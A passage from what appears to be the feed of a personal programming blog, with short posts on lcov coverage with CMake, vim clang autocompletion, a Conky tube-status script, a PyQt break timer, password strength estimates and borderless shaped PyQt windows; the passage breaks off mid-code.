&lt;p&gt;We need to make sure a debug build is on (&lt;code&gt;-g&lt;/code&gt;), that we build without optimisation (&lt;code&gt;-O0&lt;/code&gt;), and enable profiling (&lt;code&gt;-fprofile-arcs -ftest-coverage&lt;/code&gt;). On the link phase we need to link against the google unit test libraries and pthread. Once you have sucessfully built your unit test you can then use lcov to generate the coverage results. Although you'll soon notice that it might not work. CMake places its files into different directories than you'd expect from make or other build systems. So here's what I did to get this to work. Assuming you have a &lt;cite&gt;:code:`tests&lt;/cite&gt;:code:` directory in your build, where your tests are and the test runner binary is built into, you have to run the following from that directory (&lt;code&gt;${PROJECTDIR}/build/tests&lt;/code&gt;):&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$ lcov --zerocounters --directory .
$ lcov --capture --initial --directory . --output-file app

&lt;span class="c1"&gt;# Now run your test app in the same directory
&lt;/span&gt;
$ lcov --no-checksum --directory . --capture --output-file app.info
$ genthml app.info
&lt;/pre&gt;
&lt;p&gt;Now you can point your browser to that directory and you will have the nice html view of your coverage data.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: sometimes I got an error from the second to last line saying it could not find any gcno files. In this case I just ran the test runner again and then ran the last two lines from above again.&lt;/p&gt;
&lt;p&gt;Hope this helps you out in case you have the same issue as me.&lt;/p&gt;
</summary></entry><entry><title>vim clang autocompletion</title><link href="http://unlogic.co.uk/2012/07/13/vim-clang-autocompletion/" rel="alternate"></link><updated>2012-07-13T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-07-13:2012/07/13/vim-clang-autocompletion/</id><summary type="html">&lt;p&gt;Code completion. Isn't it nice? Especially when you have a so many APIs that you can't always remember EVERY method, member or class name in it.&lt;/p&gt;
&lt;p&gt;Vim. Isn't it powerful? The ease and speed with which it allows you to edit your code and do your work is just lovely.&lt;/p&gt;
&lt;p&gt;But code completion in vim? Well yes. You can use ctags. Yes, you can make tag files for ALL your APIs and autocompletion works rather well. I did this and the Qt tags file is 1.7GB. So, urm yeah, that's not entirely awesome either. Plus it doesn't handle things like smart pointers, which you will no doubt come across at some stage.&lt;/p&gt;
&lt;p&gt;So come on down &lt;a class="reference external" href="https://github.com/Rip-Rip/clang_complete"&gt;clang_complete&lt;/a&gt;. A little plugin for vim that uses &lt;a class="reference external" href="http://clang.llvm.org/"&gt;clang&lt;/a&gt; to resolve the necessary symbols. Plus it's reasonably easy to set up. All you need to do is follow the instructions that come with the plugin to install it. You will also need to install/build clang. For our purposes we will only need &lt;code&gt;libclang.so&lt;/code&gt; as we will be using the library to do the completion instead of the binary - this is also the faster way. In order to use the library you need to add two things to your &lt;code&gt;.vimrc&lt;/code&gt; file&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:clang_use_library &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:clang_library_path &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/path/to/libclang&amp;quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;/path/to/libclang&lt;/code&gt; is the path where libclang.so is located, not including the file name itself. Once you have set this up we should already see the autocomplete working when you start typing &lt;code&gt;. -&amp;gt;  ::&lt;/code&gt; after a variable.
But in order to specify the right paths to header files, we also need to make a &lt;code&gt;.clang_complete&lt;/code&gt; file in our project's root directory. This includes the compiler's include flags like &lt;code&gt;-I/path/to/boost&lt;/code&gt;. Luckily there's a handy tool that can generate this file from the current Makefile. It's located in &lt;code&gt;~/.vim/bin&lt;/code&gt;. All you need to do is build your project by passing &lt;code&gt;CXX='~/.vim/bin/cc_args.py g++'&lt;/code&gt; to the make command. For example:&lt;/p&gt;
&lt;pre class="code make literal-block"&gt;
&lt;span class="err"&gt;make&lt;/span&gt; &lt;span class="nv"&gt;CXX&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'~/.vim/bin/cc_args.py g++'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I should also mention that symbol resolution is scope dependant in case you see some weird completions. Enjoy.&lt;/p&gt;
&lt;p&gt;EDIT 17/11/2012 The &lt;code&gt;.clang_include&lt;/code&gt; file should actually be called &lt;code&gt;.clang_complete&lt;/code&gt;&lt;/p&gt;
</summary></entry><entry><title>Tube status for Conky</title><link href="http://unlogic.co.uk/2012/06/07/tube-status-for-conky/" rel="alternate"></link><updated>2012-06-07T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-06-07:2012/06/07/tube-status-for-conky/</id><summary type="html">&lt;p&gt;Last night I was affected by &amp;quot;severe delays on the Central line&amp;quot; caused by a burst watermain and bringing part of the line to its knees. Unfortunately I only found this out once I got to the station. Usually the line is well behaved and I have little need to check it often. I know it's really quick to do so and there's a whole host of ways to dit too. But the problems I have with them are:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;strong&gt;Check online&lt;/strong&gt;: Have to remember to go online and check, which I often/always forget.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;iPhone app&lt;/strong&gt;: Same again. Have to remember to actually do that each time I leave the office.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Email alerts&lt;/strong&gt;: I get a fair bit of email each day and end up just clicking &lt;em&gt;delete&lt;/em&gt; or &lt;em&gt;mark as read&lt;/em&gt; on stuff like that&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So here's what I've come up with&lt;/p&gt;
&lt;p&gt;A CLI app that checks the tube status for any number of given lines. &amp;quot;Yeah, how does that help?&amp;quot; I hear you ask. &amp;quot;You still have to use it to check it&amp;quot; you say. True. But there's another way to use it: Conky.&lt;/p&gt;
&lt;p&gt;I use &lt;a class="reference external" href="http://conky.sourceforge.net/"&gt;Conky&lt;/a&gt; and I love it. So what better than to have the tube status for the relevant lines &lt;strong&gt;always&lt;/strong&gt; on my desktop and updating every few seconds? So I quickly put together this python script to accomplish the task:&lt;/p&gt;
&lt;script src="https://gist.github.com/Svenito/2888187.js"&gt;&lt;/script&gt;&lt;p&gt;And it looks like this:&lt;/p&gt;
&lt;img alt="" src="/images/conky.png" /&gt;
&lt;p&gt;To add it to Conky just edit the &lt;code&gt;.conkyrc&lt;/code&gt; file and add a line like so:
&lt;code&gt;$alignr${execi 2 /path/to/tube.py central -s}&lt;/code&gt; where &lt;em&gt;central&lt;/em&gt; is the name(s)
of the line(s) (separate multiple lines with spaces) you want to get statuses for. The full list of lines is &lt;a class="reference external" href="http://tubeupdates.com/documentation/"&gt;here&lt;/a&gt;. The -s simply tells the script to supress the output of the full message and shows only the line name and short status.&lt;/p&gt;
&lt;p&gt;It'd be good to know if you find it useful or if you have any suggestions for it.&lt;/p&gt;
</summary></entry><entry><title>Sitting is bad</title><link href="http://unlogic.co.uk/2012/06/06/sitting-is-bad/" rel="alternate"></link><updated>2012-06-06T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-06-06:2012/06/06/sitting-is-bad/</id><summary type="html">&lt;p&gt;So the internet has recently been telling me that sitting is bad. Really bad. Well only if you &lt;a class="reference external" href="http://www.msnbc.msn.com/id/34956099/ns/health-fitness/t/you-sitting-down-experts-say-itll-kill-you/"&gt;sit&lt;/a&gt; &lt;a class="reference external" href="http://mashable.com/2011/05/09/sitting-down-infographic/"&gt;for&lt;/a&gt; &lt;a class="reference external" href="http://lifehacker.com/5800720/the-sitting-is-killing-you-infographic-illustrates-the-stress-of-prolonged-sitting-importance-of-getting-up"&gt;long&lt;/a&gt; &lt;a class="reference external" href="http://www.sciencedaily.com/releases/2011/07/110712093859.htm"&gt;periods&lt;/a&gt; of time. At my office it is very unlikely that they will be willing to furnish me with a standing desk unless my doctor tells them to. The latter also being unlikely as my back isn't in a bad enough shape &lt;em&gt;yet&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I'm also not willing to &lt;a class="reference external" href="http://gregschlom.com/post/4555981908/standing-desk"&gt;make my own&lt;/a&gt; version of a standing desk either, unless it was a better looking one. So now what? Fear not. It turns out that if you stand for about 5 minutes every hour it already helps &lt;strong&gt;A LOT&lt;/strong&gt;. So that I don't miss my standing breaks, I need a timer. An unobtrusive little app that sits in my taskbar and just alerts me at intervals to take a break and have a stand. Far be it for me to actually go looking for something that does this just how I want it. That sounds like too much work really. Thus I decided to turn it into a project for myself and write my own. I mean, how hard can it be?&lt;/p&gt;
&lt;p&gt;Turns out: not so hard at all. After about an hour of hacking around with some PyQt I made this: &lt;a class="reference external" href="https://github.com/Svenito/EasyTimer"&gt;https://github.com/Svenito/EasyTimer&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It runs in the system tray, lets you set a custom timer period and then it pops up a window once the time expires. Not tested to destruction or particularily pretty, but it does what it needs to do. I'll need to tweak some dialogs and add some little features, but if you want to do yourself a favour and take regular breaks, grab the timer and give it a go.&lt;/p&gt;
&lt;p&gt;Right, time for a stand me thinks....&lt;/p&gt;
</summary><category term="python"></category></entry><entry><title>Strong passwords?</title><link href="http://unlogic.co.uk/2012/06/06/strong-passwords/" rel="alternate"></link><updated>2012-06-06T00:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-06-06:2012/06/06/strong-passwords/</id><summary type="html">&lt;p&gt;As I'm just going around and updating the passwords to some of my online accounts, which was prompted by &lt;a class="reference external" href="http://translate.google.com/translate?hl=en&amp;amp;sl=no&amp;amp;tl=en&amp;amp;u=http://www.dagensit.no/article2411857.ece"&gt;this&lt;/a&gt; article, I was wonderingwhat a good password really is. Not just in terms of security but also in terms of user friendliness.&lt;/p&gt;
&lt;p&gt;&amp;lt;!--more--&amp;gt;&lt;/p&gt;
&lt;p&gt;I use &lt;a class="reference external" href="http://www.lastpass.com)tomanagemypasswordsandhaveitautofillinmycredentialsonvarioussites.ThisworkswelluntilIneedtomanuallyenterthemonanotherdevice(iPhoneforexample-Ihaven'tgotapremiumsubscriptionyet"&gt;Lastpass&lt;/a&gt; or have to type it in just because.&lt;/p&gt;
&lt;p&gt;We know that everywhere suggests some wonderfully random characters of at least 8 characters in length and Lastpass actually provides a tool to generate these:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;k%U94*7r&lt;/li&gt;
&lt;li&gt;66ds}9R&lt;/li&gt;
&lt;li&gt;9^wtH7xo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here we have some 8 character examples for apparently fairly secure options. Fine. They probably are secure. But do you really want to type those in using a touch keyboard on a phone?&lt;/p&gt;
&lt;p&gt;Now here's my suggestion: &lt;strong&gt;Three or more random, unrelated words making one password.&lt;/strong&gt;
For example:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;tarnishedmoleclouds&lt;/li&gt;
&lt;li&gt;refriedchutneygarbage&lt;/li&gt;
&lt;li&gt;turkeyloadedparasol&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those of you who read [XKCD](&lt;a class="reference external" href="http://xkcd.com/936/"&gt;http://xkcd.com/936/&lt;/a&gt;) should already be on the same page as me. Not only are these more memorable (which if you use a password manager is irrelevant) but also much easier to type in on any type of keyboard. But that's not all. Let's have a look at bruteforce times using &lt;a class="reference external" href="http://www.lockdown.co.uk/?pg=combi"&gt;these tables&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In the first case we have 8 character passwords made up of &amp;quot;Mixed upper and lower case alphabet and common symbols.&amp;quot;. According to the relevant table (and we are assuming a reasonably competent team of crackers using a &lt;a class="reference external" href="http://www.lockdown.co.uk/?pg=combi#classE)attack)thesepasswordscanbecrackedin346days.Nottoobadreally.Butlet'sseehowthatcomparesto&amp;quot;Thefullalphabet,eitherupperorlowercase(notbothinthiscase)&amp;quot;.Pickingonepasswordfromabove(refriedchutneygarbage"&gt;class E&lt;/a&gt; with 21 characters it would take at least 6.3trillions years to break. Much better. Heck, even with 1000,000,000 guesses per second you're still looking at 631billion years.&lt;/p&gt;
&lt;p&gt;I can't say how much of an impact adding/removing spaces has on the timings though - if any one knows, or has any insights, do share in the comments. Is using spaces better, the same, or worse than not using spaces? Theoretically I'd imagine that it'd be better with spaces as that's an extra character to add to the list.&lt;/p&gt;
&lt;div class="section" id="update"&gt;
&lt;h2&gt;UPDATE&lt;/h2&gt;
&lt;p&gt;Having said the above, it's worth also assuming that any competent cracker will be using wordlists too, and not just brute forcing the password. According to the &lt;a class="reference external" href="http://oxforddictionaries.com/words/how-many-words-are-there-in-the-english-language"&gt;Oxford English Dictionary&lt;/a&gt; there are about 140,000 words in use. This number is a bit high as most of us won't know, or use them all. So to get a more realistic number, I've looked at some common wordlists you can find on the internet and the word count we're looking at is around 50,000 to 70,000.&lt;/p&gt;
&lt;p&gt;Given that (as mentioned in the comments) we essentially have a 3 character password with a much larger search space, we can do the math. Three words, 60,000 (taking the middle word count) words will give us 216trillion possibilities. At a rate of 10,000,000 passwords per second it would take around 250 days to crack. Not too shabby still, but not as good as initially hoped, and also worse than your 'messy' passwords.&lt;/p&gt;
&lt;p&gt;So my solution to generating secure, but still easily typeable passwords, is to generate 15-20 character long passwords made only of random alphabetical characters rather than words. In this case the figures above will still hold true.&lt;/p&gt;
&lt;p&gt;As a quick sampler of a generated password with 16 characters, lowercase only, and pronouncable:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;alicattervetonstou&lt;/li&gt;
&lt;li&gt;molyciontivenzagol&lt;/li&gt;
&lt;li&gt;audentophitendowdy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;harder to remember, harder to crack but still easily typed out even with an onscreen keyboard. The pronounceable part is optional but it might aid in remembering the password better.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Did a change cross a threshold?</title><link href="http://unlogic.co.uk/2011/10/21/did-a-change-cross-a-threshold/" rel="alternate"></link><updated>2011-10-21T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2011-10-21:2011/10/21/did-a-change-cross-a-threshold/</id><summary type="html">&lt;p&gt;So recently I needed to check if a change to a number caused it to cross a threshold. In this case, did the change cause a crossing of a threshold that is a multiple of 25? To try and make this a little easier to understand:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;True if the first value is 14 and the new value is 28. (crosses 25)&lt;/li&gt;
&lt;li&gt;True if the first value is 43 and the new value is 58 . (crosses 50)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You get the idea. So how do we best do it. With some thinking it's actually quite easy as you just base the decision off of the number of multiples each number is of 25:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="n"&gt;prev_multiple&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;new_multiple&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_percentage&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_multiple&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;prev_multiple&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Crossed&amp;quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Nice and simple :)&lt;/p&gt;
</summary></entry><entry><title>Shapely Window in PyQT</title><link href="http://unlogic.co.uk/2011/05/27/shapely-window-in-pyqt/" rel="alternate"></link><updated>2011-05-27T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2011-05-27:2011/05/27/shapely-window-in-pyqt/</id><summary type="html">&lt;p&gt;Recently I needed to make a PyQt app where the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;is the shape of an image and doesn’t
have a border. I say needed, that’s not strictly true, more like wanted to because it’d be more
interesting.&lt;/p&gt;
&lt;p&gt;It wasn’t as straight forward as I had hoped but I managed to get it working in the end and
here I am about to share it with the world. Here’s what we will need:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;python,&amp;nbsp;Qt,&amp;nbsp;and PyQt installed&lt;/li&gt;
&lt;li&gt;The image you want to use as the background with transparency. PNG will do nicely&lt;/li&gt;
&lt;li&gt;A texteditor&lt;/li&gt;
&lt;li&gt;A cup of coffee&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Set the coffee aside so you don’t knock it over, but keep it within reach. First we need to
open up Designer.&lt;/p&gt;
&lt;p&gt;Once open create a new Dialog or MainWindow. Open the resource browser and add your background
image to the list of resources. Now right click on the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;and select
&lt;code&gt;Change styleSheet&lt;/code&gt;&amp;nbsp;(I am using Designer4 in case it looks different for you).
Enter the following in the popup, adjusting for names and path as appropriate.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="c1"&gt;#Dialog{&lt;/span&gt;
    &lt;span class="n"&gt;background&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;rgb&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;background&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;windowshape&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Adjusting the :code:&lt;tt class="docutils literal"&gt;#Dialog&lt;/tt&gt; to the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;name and the url path to your image.&lt;/p&gt;
&lt;p&gt;You should now see the image in the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;with a black surround. At this point it’s also
good to set the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;size to something suitable for your image.&lt;/p&gt;
&lt;p&gt;As per usual you will need to compile your .ui and resource files with pyuic and pyrcc, but details on that are outside the scope of this post.
So in order to remove the border we call this in our &lt;code&gt;__init__&lt;/code&gt; function&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;win&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QtGui&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QMainWindow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;win&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setWindowFlags&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;win&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;windowFlags&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;QtCore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Qt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FramelessWindowHint&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
    &lt;span class="n"&gt;QtCore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Qt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WindowSystemMenuHint&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It’s important to derive your class from &lt;code&gt;QtGui.QMainWindow&lt;/code&gt; otherwise this won’t work.&lt;/p&gt;
&lt;p&gt;Don’t be surprised if under certain&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;managers you still see a border, not all&amp;nbsp;&lt;cite&gt;window&lt;/cite&gt;
managers will render windows without borders from&amp;nbsp;&lt;code&gt;Qt&lt;/code&gt;. The settings are just a request rather than a demand. In Fluxbox for instance the border still shows. Gnome and KDE work fine.&lt;/p&gt;
&lt;p&gt;Right, time for a sip of coffee. You earned it. But wait, what about the black colour? We want the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;in the shape of the image. Ah yes, we do that by adding this function&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;resizeEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;pixmap&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QtGui&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QPixmap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:/img/windowshape.png&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;region&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QtGui&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QRegion&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pixmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setMask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pixmap&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This will tell&amp;nbsp;&lt;code&gt;Qt&lt;/code&gt;&amp;nbsp;to use the image as a mask for the&amp;nbsp;&lt;cite&gt;window&lt;/cite&gt;&amp;nbsp;region, effectively hiding any parts where the image is transparent.
More coffee, we're almost there. Right now, as you're swallowing that last sip, you're wondering &amp;quot;How do I move or close the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;without a border?&amp;quot;. Fear not fellow coder for there is a solution for each of these:&lt;/p&gt;
&lt;p&gt;To close the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;we just need to add a context menu. Simply done by adding one more function to your class:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;contextMenuEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;menu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;QtGui&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QMenu&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;quitAction&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;addAction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Quit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;menu&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exec_&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mapToGlobal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;quitAction&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You can of course replace the &lt;code&gt;self.close()&lt;/code&gt; with a call to some confirmation dialog if you want, but that will now enable a right-click menu on your GUI with a quit option. Also you can add keyboard shortcuts to the application as well if you are so inclined.&lt;/p&gt;
&lt;p&gt;Now for moving the thing. Here we need two extra functions, one for the mouse move and one for the mouse press:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;mouseMoveEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;buttons&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;QtCore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Qt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LeftButton&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;move&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;globalPos&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;drag_position&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
